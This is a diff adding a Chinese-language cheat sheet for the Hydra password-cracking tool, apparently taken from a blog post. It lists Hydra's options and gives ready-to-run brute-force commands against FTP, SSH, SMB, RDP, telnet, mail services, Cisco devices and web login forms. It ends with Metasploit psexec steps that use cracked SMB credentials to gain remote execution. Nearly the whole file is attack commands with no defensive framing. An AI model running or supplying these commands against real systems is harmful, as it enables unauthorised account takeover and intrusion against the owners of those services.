@@ -1,0 +1,72 @@
+http://www.ha97.com/5186.html
+使用说明：
+-R 继续从上一次进度接着破解
+-S 采用SSL链接（大写的S）
+-s PORT 如果非默认端口，可通过这个参数指定
+-l LOGIN 小写，用于指定破解的用户，对特定用户破解
+-L FILE 大写，用于指定用户的用户名字典
+-p PASS 小写，用于指定密码破解，少用，一般是采用密码字典
+-P FILE 大写，用于指定密码字典
+-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探
+-C FILE 使用冒号分割格式 例如 "登录名:密码"来代替-L/-P参数
+-M FILE 指定目标列表文件一行一条
+-o FILE 指定结果输出文件
+-f 找到第一对登录名或者密码的时候中止破解
+-t TASKS 同时运行的线程数，默认为16
+-w TIME 设置最大超时的时间，单位秒，默认是30s
+-v / -V 显示详细过程
+server 目标ip
+service 指定服务名，支持的服务跟协议有: telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp
+HYDRA_PROXY_HTTP 变量参数可以用来定义代理服务器(只能使用http代理)
+语法:
+HYDRA_PROXY_HTTP="http://ip:port/"
+HYDRA_PROXY_CONNECT=ip:8000
+如果你使用的代理需要用户名和密码，请使用HYDRA_PROXY_AUTH 变量参数:
+HYDRA_PROXY_AUTH="the_login:the_password"
+1.破解ftp
+hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
+hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
+2.get方式提交 破解web登录
+hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /web/
+hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /web/index.asp
+3.破解ssh   //linux  默认port 22 默认用户 root
+hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh2
+hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh2
+4.破解teamspeak
+hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
+5.post方式提交 破解web登录
+hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"
+6.cisco
+hydra -P pass.txt 192.168.1.229 cisco
+hydra -m cloud -P pass.txt 192.168.1.229 cisco-enable
+7.smb
+hydra -l administrator -P pass.txt 192.168.0.141 smb      
+8.pop3
+hydra -l muts -P pass.txt my.pop3.mail pop3
+9.https
+hydra -m /index.php -l muts -P pass.txt 192.168.0.12 https
+10.rdp
+hydra ip rdp -l administrator -P pass.txt -V
+11.http-proxy
+hydra -l admin -P pass.txt http-proxy://192.168.0.1
+12.imap
+hydra -L user.txt -p secret 192.168.0.1 imap PLAIN
+hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
+13.telnet
+hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V
+
+
+
+破解SMB获取 获取授权用户密码
+
+hydra -l //user  -P //passwordlist IP smb
+
+MSF利用SMB
+use exploit/windows/smb/psexec
+set SMBUser
+set SMBPass
+set rhost
+exploit
+
+caoyang
+
